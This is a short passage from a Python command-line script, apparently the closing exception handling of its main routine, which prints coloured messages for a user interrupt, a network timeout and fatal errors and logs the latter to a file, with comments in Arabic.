        # التعامل مع ضغط المستخدم على Ctrl+C
        console.print(f"\n{R}[!] {W}Operation interrupted by user (MOHA02).")
        sys.exit()
    except requests.exceptions.ReadTimeout:
        console.print(f"\n{R}[!] {W}Network Timeout: Check your internet connection!")
    except Exception as final_err:
        # تسجيل أي خطأ نهائي
        with open("final_error.log", "a") as f_err:
            f_err.write(f"{datetime.datetime.now()} -> {str(final_err)}\n")
        console.print(f"\n{R}[!] Fatal Error: {final_err}")

